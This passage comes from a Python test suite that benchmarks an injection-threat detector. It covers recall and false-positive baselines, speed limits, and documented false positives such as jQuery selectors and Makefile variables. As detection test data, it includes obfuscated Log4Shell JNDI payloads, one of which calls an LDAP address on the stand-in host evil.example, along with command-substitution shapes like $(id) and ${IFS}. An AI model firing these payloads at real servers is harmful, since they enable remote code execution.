            for category in hit_categories:
                benign_flagged_by_category[category] = (
                    benign_flagged_by_category.get(category, 0) + 1
                )

    wall_time_seconds = time.monotonic() - start

    malicious_detected_total = sum(malicious_detected_by_category.values())

    report = _build_report(
        malicious_detected_by_category,
        malicious_total_by_category,
        benign_flagged_by_category,
        len(BENIGN_CORPUS),
        malicious_detected_total,
        len(MALICIOUS_CORPUS),
        benign_flagged_total,
        wall_time_seconds,
    )
    print(report)

    for category, baseline_detected in BASELINE_MALICIOUS_DETECTED_BY_CATEGORY.items():
        actual_detected = malicious_detected_by_category.get(category, 0)
        assert actual_detected >= baseline_detected, (
            f"{category} recall regressed: baseline={baseline_detected} "
            f"actual={actual_detected} "
            f"newly_undetected={undetected_case_ids_by_category.get(category, [])}\n"
            f"{report}"
        )

    assert malicious_detected_total >= BASELINE_MALICIOUS_DETECTED_TOTAL, (
        f"overall recall regressed: baseline={BASELINE_MALICIOUS_DETECTED_TOTAL} "
        f"actual={malicious_detected_total}\n{report}"
    )

    for category in sorted(ALL_DETECTION_CATEGORIES):
        baseline_fp = BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY.get(category, 0)
        actual_fp = benign_flagged_by_category.get(category, 0)
        assert actual_fp <= baseline_fp, (
            f"{category} false-positive attribution rose: baseline={baseline_fp} "
            f"actual={actual_fp}\n{report}"
        )

    assert benign_flagged_total <= BASELINE_BENIGN_FALSE_POSITIVE_TOTAL, (
        f"overall false-positive rate rose: "
        f"baseline={BASELINE_BENIGN_FALSE_POSITIVE_TOTAL} "
        f"actual={benign_flagged_total} "
        f"unexpected={unexpected_false_positive_case_ids}\n{report}"
    )

    assert wall_time_seconds < _WALL_TIME_CEILING_SECONDS, (
        f"detection benchmark wall time regressed: "
        f"ceiling={_WALL_TIME_CEILING_SECONDS}s actual={wall_time_seconds:.3f}s"
    )


_NON_BACKTICK_PERF_CORPUS: list[str] = [
    case.payload
    for case in list(MALICIOUS_CORPUS) + list(BENIGN_CORPUS)
    if "`" not in case.payload
]

_BACKTICK_PERF_CEILING_SECONDS = 30.0


def test_glued_backtick_discriminator_perf_on_non_backtick_content() -> None:
    assert len(_NON_BACKTICK_PERF_CORPUS) >= 100

    def _scan_corpus_once() -> float:
        start = time.monotonic()
        for payload in _NON_BACKTICK_PERF_CORPUS:
            _PRODUCTION_MANAGER.detect(
                content=payload, ip_address="203.0.113.9", context="request_body"
            )
        return time.monotonic() - start

    _scan_corpus_once()
    durations = sorted([_scan_corpus_once() for _ in range(5)])
    median_seconds = durations[len(durations) // 2]

    print(
        f"glued backtick discriminator perf on {len(_NON_BACKTICK_PERF_CORPUS)} "
        f"non-backtick payloads: median={median_seconds:.4f}s "
        f"runs={[f'{d:.4f}' for d in durations]}"
    )

    assert median_seconds < _BACKTICK_PERF_CEILING_SECONDS, (
        f"non-backtick detection pass got {median_seconds:.4f}s, "
        f"more than {_BACKTICK_PERF_CEILING_SECONDS}s for "
        f"{len(_NON_BACKTICK_PERF_CORPUS)} payloads"
    )


def test_detection_benchmark_legacy_smoke() -> None:
    malicious_detected_total = 0
    for malicious_case in MALICIOUS_CORPUS:
        hit_categories = _malicious_case_detected_categories(
            malicious_case, _LEGACY_SMOKE_DETECTORS
        )
        if malicious_case.category in hit_categories:
            malicious_detected_total += 1

    benign_flagged_total = 0
    for benign_case in BENIGN_CORPUS:
        hit_categories = _benign_case_flagged_categories(
            benign_case, _LEGACY_SMOKE_DETECTORS
        )
        if hit_categories:
            benign_flagged_total += 1

    assert malicious_detected_total >= BASELINE_MALICIOUS_DETECTED_TOTAL, (
        f"legacy singleton recall regressed: "
        f"baseline={BASELINE_MALICIOUS_DETECTED_TOTAL} "
        f"actual={malicious_detected_total}"
    )
    assert benign_flagged_total <= BASELINE_BENIGN_FALSE_POSITIVE_TOTAL, (
        f"legacy singleton false-positive rate rose: "
        f"baseline={BASELINE_BENIGN_FALSE_POSITIVE_TOTAL} actual={benign_flagged_total}"
    )


_AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON = (
    "a bare single-token $(...)/${...} substitution is deliberately "
    "context-gated to query_param/url_path so it stays detected there "
    "(Renzo's ruling, variant a): the jQuery $(id)/$('#x') selector, the "
    "${HOME} shell-doc var expansion, the Makefile $(CC)/$(CFLAGS) mention, "
    "and the ${amount} template placeholder are character-identical to that "
    "attack shape as raw query-string or path-segment values, so they are "
    "flagged there too, and stay correctly benign in request_body, where "
    "the branch never fires. Resolved toward recall: detecting $(id)/$(w)/"
    "$(who)/$(groups)/$(set)/${IFS}-shaped command substitution outweighs "
    "these five documented, disclosed false positives"
)

_DOLLAR_SUBSTITUTION_DISCLOSED_FALSE_POSITIVES = [
    pytest.param(
        "cmd_injection_shell_docs_var_expansion",
        "export PATH=${HOME}/bin",
        id="shell_docs_var_expansion",
    ),
    pytest.param(
        "template_benign_dollar_brace_var",
        "Set the amount with ${amount} in the template.",
        id="template_dollar_brace_var",
    ),
    pytest.param(
        "template_benign_makefile_variable",
        "The Makefile references $(CC) and $(CFLAGS) for the compiler.",
        id="template_makefile_variable",
    ),
    pytest.param(
        "cmd_injection_jquery_selector_bare_id_call",
        "$(id).addClass('active');",
        id="jquery_selector_bare_id_call",
    ),
    pytest.param(
        "cmd_injection_jquery_selector_hash_id_call",
        "$('#submit-button').on('click', handleSubmit);",
        id="jquery_selector_hash_id_call",
    ),
]


@pytest.mark.parametrize(
    "case_id, payload", _DOLLAR_SUBSTITUTION_DISCLOSED_FALSE_POSITIVES
)
@pytest.mark.parametrize("context", ["query_param", "url_path"])
def test_dollar_substitution_disclosed_false_positive_detected(
    case_id: str, payload: str, context: str
) -> None:
    result = _PRODUCTION_MANAGER.detect(
        content=payload, ip_address="203.0.113.9", context=context
    )
    assert result["is_threat"] is True, (
        f"{case_id} expected to be a disclosed false positive in {context}: "
        f"{_AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON}"
    )


_LOG4SHELL_URL_PATH_BONUS_PAYLOADS = [
    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
    pytest.param(
        "${${lower:j}ndi:ldap://evil.example/a}",
        id="log4shell_obfuscated_nested_full_exploit",
    ),
]


@pytest.mark.parametrize("payload", _LOG4SHELL_URL_PATH_BONUS_PAYLOADS)
def test_log4shell_obfuscated_payload_detected_in_url_path(
    payload: str,
) -> None:
    result = _PRODUCTION_MANAGER.detect(
        content=payload, ip_address="203.0.113.9", context="url_path"
    )
    assert result["is_threat"] is True
